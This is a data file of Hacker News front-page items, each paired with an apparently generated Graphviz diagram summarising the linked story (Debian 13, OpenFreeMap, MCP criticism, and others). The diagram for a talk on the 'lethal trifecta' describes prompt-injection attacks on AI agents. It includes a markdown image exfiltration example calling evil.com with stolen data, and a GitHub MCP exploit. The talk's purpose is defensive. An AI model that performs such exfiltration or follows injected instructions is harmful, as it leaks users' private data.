title	url	points	by	hnId	dot
Show HN: The current sky at your approximate location, as a CSS gradient	https://sky.dlazaro.ca	544	dlazaro	44846281	digraph horizon_view{rankdir=TB;bgcolor="transparent"; labelloc="t";label="Horizon View\n(37.38930°N, 122.07830°W)";fontname="Helvetica";fontsize=16; earth[shape=ellipse, style=filled, color="0.1 0.5 0.9", label="Earth Surface"];sky[shape=ellipse, style=filled, color="0.6 0.8 1.0", label="Sky"];horizon[shape=plaintext, label="Horizon Line", fontsize=12];coordinates[shape=note, label="37.38930°N\n122.07830°W", fontname="Courier"];viewer[shape=circle, style=filled, color=white, label="Observer"]; earth->horizon[style=invis];sky->horizon[style=invis];viewer->horizon[dir=none, color=grey];viewer->coordinates[dir=none, style=dashed, color=darkgreen];{rank=same;earth horizon sky}earth->sky[style=invis];}
Debian 13 "Trixie"	https://www.debian.org/News/2025/20250809	508	ducktective	44848782	digraph DebianRelease{rankdir=TB;node[shape=box, style=filled, color=lightblue];Debian13[label="Debian 13 (trixie)"];SecurityTeam[label="Debian Security Team"];LTSTeam[label="Debian Long Term Support"];GNOME48[label="GNOME 48"];KDEPlasma63[label="KDE Plasma 6.3"];LXDE13[label="LXDE 13"];LXQt210[label="LXQt 2.1.0"];Xfce420[label="Xfce 4.20"];NewPackages[label="14,100 New Packages"];TotalPackages[label="69,830 Total Packages"];RemovedPackages[label="8,840 Removed Packages"];UpdatedPackages[label="44,326 Updated Packages"];DiskUsage[label="403,854,660 kB (403 GB)"];CodeLines[label="1,463,291,186 Lines of Code"];Translations[label="Multiple Language Translations"];ManPages[label="man-pages in Multiple Languages"];TimeTABI[label="64-bit time_t ABI"];ReproducibleBuilds[label="Package Builds Reproducible"];DebianReproStatus[label="debian-repro-status Package"];LLVMClang[label="LLVM/Clang Toolchain 19, 17, 18"];Apache2464[label="Apache 2.4.64"];Bash5237[label="Bash 5.2.37"];BIND920[label="BIND DNS Server 9.20"];Cryptsetup27[label="Cryptsetup 2.7"];CurlLibcurl8141[label="curl/libcurl 8.14.1"];Emacs301[label="Emacs 30.1"];Exim498[label="Exim (default email server) 4.98"];GNUcash510[label="GNUcash 5.10"];GCC142[label="GNU Compiler Collection 14.2"];GIMP304[label="GIMP 3.0.4"];GnuPG247[label="GnuPG 2.4.7"];Inkscape14[label="Inkscape 1.4"];GNUCLibrary241[label="the GNU C Library 2.41"];LibreOffice252[label="LibreOffice 25.2"];LinuxKernel612[label="Linux kernel 6.12 LTS series"];MariaDB118[label="MariaDB 11.8"];Nginx126[label="Nginx 1.26"];OpenJDK21[label="OpenJDK 21"];OpenLDAP2610[label="OpenLDAP 2.6.10"];OpenSSH100p1[label="OpenSSH 10.0p1"];OpenSSL35[label="OpenSSL 3.5"];Perl540[label="Perl 5.40"];PHP84[label="PHP 8.4"];Postfix310[label="Postfix 3.10"];PostgreSQL17[label="PostgreSQL 17"];Python313[label="Python 3, 3.13"];Rustc185[label="Rustc 1.85"];Samba422[label="Samba 4.22"];Systemd257[label="Systemd 257"];Vim91[label="Vim 9.1"];Architectures[label="7 Architectures Supported"];LiveImages[label="Live Images Available"];CloudSupport[label="Cloud Computing Support"];InstallationGuide[label="Installation Guide Available"];Debian13->SecurityTeam;Debian13->LTSTeam;Debian13->GNOME48;Debian13->KDEPlasma63;Debian13->LXDE13;Debian13->LXQt210;Debian13->Xfce420;Debian13->NewPackages;Debian13->TotalPackages;Debian13->RemovedPackages;Debian13->UpdatedPackages;Debian13->DiskUsage;Debian13->CodeLines;Debian13->Translations;Debian13->ManPages;Debian13->TimeTABI;Debian13->ReproducibleBuilds;Debian13->DebianReproStatus;Debian13->LLVMClang;Debian13->Apache2464;Debian13->Bash5237;Debian13->BIND920;Debian13->Cryptsetup27;Debian13->CurlLibcurl8141;Debian13->Emacs301;Debian13->Exim498;Debian13->GNUcash510;Debian13->GCC142;Debian13->GIMP304;Debian13->GnuPG247;Debian13->Inkscape14;Debian13->GNUCLibrary241;Debian13->LibreOffice252;Debian13->LinuxKernel612;Debian13->MariaDB118;Debian13->Nginx126;Debian13->OpenJDK21;Debian13->OpenLDAP2610;Debian13->OpenSSH100p1;Debian13->OpenSSL35;Debian13->Perl540;Debian13->PHP84;Debian13->Postfix310;Debian13->PostgreSQL17;Debian13->Python313;Debian13->Rustc185;Debian13->Samba422;Debian13->Systemd257;Debian13->Vim91;Debian13->Architectures;Debian13->LiveImages;Debian13->CloudSupport;Debian13->InstallationGuide;}
OpenFreeMap survived 100k requests per second	https://blog.hyperknot.com/p/openfreemap-survived-100000-requests	358	hyperknot	44846318	digraph openfreemap_incident{rankdir=TB;bgcolor="transparent";node[fontname="Helvetica,Arial,sans-serif", shape=plaintext, fontsize=14];edge[fontname="Helvetica,Arial,sans-serif", fontsize=12];subgraph cluster_success{label="✅ 10 Months of Success";color=green;style=filled;fillcolor="#f0fff0";architecture[label=<         <TABLE BORDER="0" CELLBORDER="0" CELLSPACING="5">             <TR><TD ALIGN="LEFT"><B>⚙️ Robust Architecture</B></TD></TR>             <TR><TD ALIGN="LEFT">• Cloudflare sponsored bandwidth</TD></TR>             <TR><TD ALIGN="LEFT">• Hetzner stable servers</TD></TR>             <TR><TD ALIGN="LEFT">• Btrfs tile storage</TD></TR>             <TR><TD ALIGN="LEFT">• Nginx serving</TD></TR>         </TABLE>>];performance[label=<         <TABLE BORDER="0" CELLBORDER="0" CELLSPACING="5">             <TR><TD ALIGN="LEFT"><B>📈 Key Metrics</B></TD></TR>             <TR><TD ALIGN="LEFT">• 99.4% CDN cache rate</TD></TR>             <TR><TD ALIGN="LEFT">• $500/month operational cost</TD></TR>         </TABLE>>];}trigger[label=<     <TABLE BORDER="1" CELLBORDER="0" CELLSPACING="5" STYLE="ROUNDED" BGCOLOR="#fff0f0">         <TR><TD ALIGN="CENTER"><B>🚨 CRITICAL INCIDENT</B></TD></TR>         <TR><TD ALIGN="LEFT">• Tiles failing to load</TD></TR>         <TR><TD ALIGN="LEFT">• Nginx error: "Too many open files"</TD></TR>         <TR><TD ALIGN="LEFT">• Cloudflare traffic spike</TD></TR>     </TABLE>>];traffic_stats[label=<     <TABLE BORDER="0" CELLBORDER="0" CELLSPACING="5" BGCOLOR="#f0f7ff">         <TR><TD COLSPAN="2" ALIGN="CENTER"><B>🌪️ Traffic Tsunami</B></TD></TR>         <TR><TD ALIGN="LEFT">3B requests</TD><TD ALIGN="RIGHT">24 hours</TD></TR>         <TR><TD ALIGN="LEFT">215 TB data</TD><TD ALIGN="RIGHT">70kB files</TD></TR>         <TR><TD ALIGN="LEFT">100k req/sec</TD><TD ALIGN="RIGHT">Peak load</TD></TR>         <TR><TD ALIGN="LEFT">$6M+</TD><TD ALIGN="RIGHT">Equivalent commercial cost</TD></TR>     </TABLE>>];source[label=<     <TABLE BORDER="0" CELLBORDER="0" CELLSPACING="5">         <TR><TD ALIGN="CENTER"><B>🔍 Source Identified</B></TD></TR>         <TR><TD ALIGN="CENTER">Wplace.live collaborative art platform</TD></TR>         <TR><TD ALIGN="LEFT">• 2M unexpected users</TD></TR>         <TR><TD ALIGN="LEFT">• Scripted requests (1,500 req/user)</TD></TR>         <TR><TD ALIGN="LEFT">• Pixel-drawing automation</TD></TR>     </TABLE>>];mitigation[label=<     <TABLE BORDER="0" CELLBORDER="0" CELLSPACING="5" BGCOLOR="#fffff0">         <TR><TD COLSPAN="2" ALIGN="CENTER"><B>🛡️ Mitigation Steps</B></TD></TR>         <TR><TD>1.</TD><TD>Cloudflare rule blocking excessive traffic</TD></TR>         <TR><TD>2.</TD><TD>Contacted Wplace.live developers</TD></TR>         <TR><TD>3.</TD><TD>Offered self-hosting solution</TD></TR>     </TABLE>>];future[label=<     <TABLE BORDER="0" CELLBORDER="0" CELLSPACING="5">         <TR><TD COLSPAN="2" ALIGN="CENTER"><B>🔮 Future Improvements</B></TD></TR>         <TR><TD>•</TD><TD>Referer-based bandwidth limiting</TD></TR>         <TR><TD>•</TD><TD>Custom header identification</TD></TR>         <TR><TD>•</TD><TD>Server config optimization</TD></TR>     </TABLE>>];cta[label=<     <TABLE BORDER="1" CELLBORDER="0" CELLSPACING="5" STYLE="ROUNDED" BGCOLOR="#e6f7ff">         <TR><TD ALIGN="CENTER"><B>💖 Support OpenFreeMap</B></TD></TR>         <TR><TD ALIGN="CENTER">github.com/sponsors/hyperknot</TD></TR>     </TABLE>>];architecture->trigger[minlen=2];trigger->traffic_stats[label="Cloudflare dashboard"];traffic_stats->source[label="Traffic analysis"];source->mitigation[label="Immediate action"];mitigation->future[label="Prevent recurrence"];future->cta[style=dashed, minlen=2];}
My Lethal Trifecta talk at the Bay Area AI Security Meetup	https://simonwillison.net/2025/Aug/9/bay-area-ai/	262	vismit2000	44846922	digraph G{graph[rankdir=TB, bgcolor="transparent", fontname="Helvetica", fontcolor="#333333", penwidth=0.5]node[shape=plaintext, style=filled, fillcolor="#f8f9fa", fontname="Helvetica", fontsize=12, margin=0.15, penwidth=0.5]edge[color="#6c757d", arrowsize=0.7, penwidth=0.5]lethal_trifecta[label=<<table border="0" cellborder="0"><tr><td><font point-size="16"><b>🚨 THE LETHAL TRIFECTA</b></font></td></tr></table>>, shape=ellipse, fillcolor="#fff0f0"];private_data[label=<<table border="0" cellborder="0"><tr><td><b>🔒 Access to</b></td></tr><tr><td><b>Private Data</b></td></tr></table>>];external_comms[label=<<table border="0" cellborder="0"><tr><td><b>📡 Ability to</b></td></tr><tr><td><b>Externally Communicate</b></td></tr></table>>];untrusted_content[label=<<table border="0" cellborder="0"><tr><td><b>⚠️ Exposure to</b></td></tr><tr><td><b>Untrusted Content</b></td></tr></table>>];prompt_injection[label=<<table border="0" cellborder="0"><tr><td><font point-size="14"><b>⚡ PROMPT INJECTION</b></font></td></tr><tr><td align="left">• Root cause: string concatenation<br/>• Analogous to SQL injection<br/>• Enables attacks when combined<br/>with Trifecta components</td></tr></table>>, shape=rect, fillcolor="#e6f7ff"];markdown_exfil[label=<<table border="0" cellborder="0"><tr><td><b>🧨 Markdown Exfiltration</b></td></tr><tr><td align="left">Embed data in image URLs<br/>e.g. ![ ](https://evil.com?data=...)</td></tr></table>>];github_mcp[label=<<table border="0" cellborder="0"><tr><td><b>💥 GitHub MCP Exploit</b></td></tr><tr><td align="left">Malicious issue → Private data<br/>exposed via public PR</td></tr></table>>];mitigations[label=<<table border="0" cellborder="0"><tr><td><font point-size="14"><b>🛡️ MITIGATIONS</b></font></td></tr><tr><td align="left">• Remove 1+ Trifecta legs<br/>• Domain allow-listing (carefully!)<br/>• CaMeL framework<br/>• Avoid prompt begging/scanning</td></tr></table>>, shape=rect, fillcolor="#e6ffe6"];fails[label=<<table border="0" cellborder="0"><tr><td><b>❌ Ineffective:</b></td></tr><tr><td align="left">Prompt begging<br/>AI scanning (99% ≠ secure)</td></tr></table>>];lethal_trifecta->{private_data, external_comms, untrusted_content}[dir=none]untrusted_content->prompt_injection prompt_injection->{markdown_exfil, github_mcp}lethal_trifecta->github_mcp[style=dashed]mitigations->fails[dir=back]{private_data external_comms}->mitigations}
MCP overlooks hard-won lessons from distributed systems	https://julsimon.medium.com/why-mcps-disregard-for-40-years-of-rpc-best-practices-will-burn-enterprises-8ef85ce5bc9b	247	yodon	44846871	digraph Model_Context_Protocol{node[shape=box, style=filled, fontname="Helvetica", fontsize=10];main_idea[label="Model Context Protocol (MCP)", fillcolor="#CCCCCC"]; issue1[label="Lack of Type Safety", fillcolor="#FF9999"];issue2[label="Inconsistent Implementations", fillcolor="#FF9999"];issue3[label="No Machine-Readable Contracts", fillcolor="#FF9999"];issue4[label="Insufficient Security Features", fillcolor="#FF9999"];issue5[label="No Distributed Tracing", fillcolor="#FF9999"];issue6[label="No Cost Attribution", fillcolor="#FF9999"];consequence1[label="Production Failures", fillcolor="#FF3333"];consequence2[label="Security Breaches", fillcolor="#FF3333"];consequence3[label="Operational Nightmares", fillcolor="#FF3333"];history1[label="UNIX RPC (1982)", fillcolor="#CCCC99"];history2[label="CORBA (1991)", fillcolor="#CCCC99"];history3[label="REST (2000)", fillcolor="#CCCC99"];history4[label="SOAP (2000)", fillcolor="#CCCC99"];history5[label="gRPC (2016)", fillcolor="#CCCC99"];main_idea->issue1;main_idea->issue2;main_idea->issue3;main_idea->issue4;main_idea->issue5;main_idea->issue6;issue1->consequence1;issue2->consequence1;issue3->consequence2;issue4->consequence2;issue5->consequence3;issue6->consequence3;history1->main_idea;history2->main_idea;history3->main_idea;history4->main_idea;history5->main_idea;}
Mexico to US livestock trade halted due to screwworm spread	https://www.usda.gov/about-usda/news/press-releases/2025/07/09/secretary-rollins-takes-decisive-action-and-shuts-down-us-southern-border-ports-livestock-trade-due	242	burnt-resistor	44846758	digraph USDA{node[shape=box, style=filled, color=lightblue];SecretaryRollins[label="Secretary Rollins"];Action[label="Takes Decisive Action"];Shutdown[label="Shuts Down U.S. Southern Border Ports"];LivestockTrade[label="Livestock Trade"];Screwworm[label="New World Screwworm"];Spread[label="Further Northward Spread"];Mexico[label="Mexico"];SecretaryRollins->Action;Action->Shutdown;Shutdown->LivestockTrade[label="Due to Spread"];Screwworm->Spread[label="Detected in Mexico"];Spread->Mexico[label="Northward from Previous Detection"];}
Long-term exposure to outdoor air pollution linked to increased risk of dementia	https://www.cam.ac.uk/research/news/long-term-exposure-to-outdoor-air-pollution-linked-to-increased-risk-of-dementia	242	hhs	44846164	digraph pollution_dementia{rankdir=LR;node[shape=box, style=filled, color=lightgrey];edge[color=darkgreen, penwidth=2]; "Outdoor Air Pollution"->"Increased Dementia Risk"[label="Long-term exposure\n↑17% risk per 10μg/m³ PM2.5", fontsize=12]; "Outdoor Air Pollution"->{"PM2.5\n(vehicle emissions,\nwood burning)" "Nitrogen Dioxide\n(NO₂)" "Soot"}[arrowhead=none, color=gray]; "PM2.5"[shape=ellipse, color=orange];"Nitrogen Dioxide\n(NO₂)"[shape=ellipse, color=red];"Soot"[shape=ellipse, color=black, fontcolor=white]; "Increased Dementia Risk"->{"Alzheimer's Disease" "Vascular Dementia\n(stronger effect)"}[arrowhead=none, color=blue]; "University of Cambridge\n(29M people studied)"->"Outdoor Air Pollution"[style=dotted, arrowhead=none]; "PM2.5"->"Brain Inflammation"->"Dementia Pathways";"NO₂"->"Oxidative Stress"->"Dementia Pathways"; graph[bgcolor=transparent];"Dementia Pathways"[shape=octagon, color=lightblue];"University of Cambridge\n(29M people studied)"[shape=note, color=lightyellow];{rank=same;"Outdoor Air Pollution";"Increased Dementia Risk"}{rank=same;"PM2.5";"Nitrogen Dioxide\n(NO₂)";"Soot"}}
Let's properly analyze an AI article for once	https://nibblestew.blogspot.com/2025/08/lets-properly-analyze-ai-article-for.html	197	pabs3	44843605	digraph G{bgcolor="transparent";rankdir=TB;node[shape=plaintext, fontname="Helvetica", fontsize=12, margin=0.2];edge[color="#555555", arrowhead=vee];GitHubCEO[label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0" CELLPADDING="4">         <TR><TD BGCOLOR="#e6f7ff">GitHub CEO Blog Post<br/><font point-size="10">"Developers Reinvented"</font></TD></TR>         <TR><TD BGCOLOR="#ffebee"><font color="#d32f2f">"Embrace AI or leave career"<br/>claim criticized as misrepresented</font></TD></TR>     </TABLE>>];USSR[label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0" CELLPADDING="4">         <TR><TD BGCOLOR="#fff3e0" COLSPAN="2"><b>Soviet Statistical Tactics</b><br/><font point-size="10">(Parallels drawn)</font></TD></TR>         <TR><TD BGCOLOR="#ffecb3">% Only Reports</TD><TD>Hide absolute values<br/><font point-size="9">(e.g. "600% shoe growth")</font></TD></TR>         <TR><TD BGCOLOR="#ffecb3">Creative Comparisons</TD><TD>Vs. worst historical baseline<br/><font point-size="9">(e.g. 1913 pre-revolution)</font></TD></TR>         <TR><TD BGCOLOR="#ffecb3">Altered Metrics</TD><TD>"Wet weight" measurements<br/><font point-size="9">(vs. standard dry weight)</font></TD></TR>     </TABLE>>];Study[label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0" CELLPADDING="4">         <TR><TD BGCOLOR="#f5f5f5" COLSPAN="2"><b>Flawed "Field Study"</b></TD></TR>         <TR><TD BGCOLOR="#e8f5e9">Sample Size</TD><TD>N=22 (statistically insignificant)</TD></TR>         <TR><TD BGCOLOR="#e8f5e9">Methodology</TD><TD>No selection criteria<br/>No incentive disclosure</TD></TR>         <TR><TD BGCOLOR="#e8f5e9">Findings Shift</TD><TD><font color="#d32f2f">"Time saving" → "Increased ambition"</font></TD></TR>     </TABLE>>];Criticisms[label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0" CELLPADDING="4">         <TR><TD BGCOLOR="#f3e5f5"><b>Fundamental Criticisms</b></TD></TR>         <TR><TD>• Misleading gravity-defying imagery</TD></TR>         <TR><TD>• No productivity gains demonstrated</TD></TR>         <TR><TD>• "Increased ambition" = scope creep risk</TD></TR>         <TR><TD>• CS education misrepresentation</TD></TR>     </TABLE>>];GitHubCEO->USSR[label="Statistical manipulation\ntechniques"];GitHubCEO->Study[label="Cited as evidence"];GitHubCEO->Criticisms[label="Core flaws"];Study->Criticisms[label="Findings contradict\nAI narratives"];USSR->Criticisms[label="Parallel: Data\nmisrepresentation"];}
Dial-up Internet to be discontinued	https://help.aol.com/articles/dial-up-internet-to-be-discontinued	169	Kye	44843369	digraph AOL_Dialup_Discontinuation{rankdir=TB;bgcolor="transparent"; node[fontname="Helvetica", shape=box, style="rounded,filled"];edge[fontname="Helvetica", color="#5D5D5D"]; "AOL"[fillcolor="#3399FF", fontcolor=white, penwidth=0];"Dial-up Service"[fillcolor="#FF6666", fontcolor=white];"Modern Internet"[fillcolor="#66CC99", fontcolor=white];"Discontinuation\n(Sept 30, 2025)"[fillcolor="#FFCC66", shape=octagon]; "AOL App"[fillcolor="#99CCFF"];"AOL Mail"[fillcolor="#99CCFF"];"Desktop Gold"[fillcolor="#99CCFF"];"Mobile Apps"[fillcolor="#99CCFF"]; "1990s-2000s"[shape=plaintext];"2025"[shape=plaintext]; "AOL"->"Dial-up Service"[label="Historical Offering", style=dashed];"AOL"->"Modern Internet"[label="Current Focus"];"Dial-up Service"->"Discontinuation\n(Sept 30, 2025)"; "Modern Internet"->{"AOL App", "AOL Mail", "Desktop Gold", "Mobile Apps"}[dir=none]; "1990s-2000s"->"Dial-up Service"[style=invis];"2025"->"Discontinuation\n(Sept 30, 2025)"[style=invis]; subgraph cluster_legend{label="Key Information";fontsize=10;style=dotted; "Key Date"[shape=octagon, fillcolor="#FFCC66"];"Discontinued"[fillcolor="#FF6666"];"Modern Offerings"[fillcolor="#66CC99"];"AOL Brand"[fillcolor="#3399FF"];} "© 2025 Yahoo"[shape=plaintext, fontsize=8];}
Jan – Ollama alternative with local UI	https://github.com/menloresearch/jan	169	maxloh	44845272	digraph JanAI{rankdir=LR;node[shape=box, style=filled, fillcolor="#f0f8ff", fontname="Helvetica"]; "Jan AI"[fillcolor="#d4f1f9", shape=ellipse, fontsize=16];"100% Offline"[fillcolor="#e6ffe6"];"Open Source"[fillcolor="#ffe6e6"];"Local LLMs"[fillcolor="#e6e6ff"]; "LLaMA"[fillcolor="#f5e6ff"];"Gemma"[fillcolor="#f5e6ff"];"Qwen"[fillcolor="#f5e6ff"]; "Privacy Focus"[fillcolor="#fff2e6"];"Custom Assistants"[fillcolor="#fff2e6"];"Cloud Integration"[fillcolor="#fff2e6"];"OpenAI-Compatible API"[fillcolor="#fff2e6"]; "Jan AI"->{"100% Offline", "Open Source", "Local LLMs"}"Local LLMs"->{"LLaMA", "Gemma", "Qwen"}"Jan AI"->{"Privacy Focus", "Custom Assistants", "Cloud Integration", "OpenAI-Compatible API"} "Platforms"[shape=record, label="{Windows|macOS|Linux}"];"Jan AI"->"Platforms"[style=dashed]; "Key Properties"[shape=note, fillcolor="#ffffcc", label="• Runs on consumer hardware\n• Apache 2.0 License\n• Self-contained installation"];"Jan AI"->"Key Properties"[style=dotted];{rank=same;"100% Offline";"Open Source";"Local LLMs"}{rank=same;"LLaMA";"Gemma";"Qwen"}{rank=same;"Privacy Focus";"Custom Assistants"}}
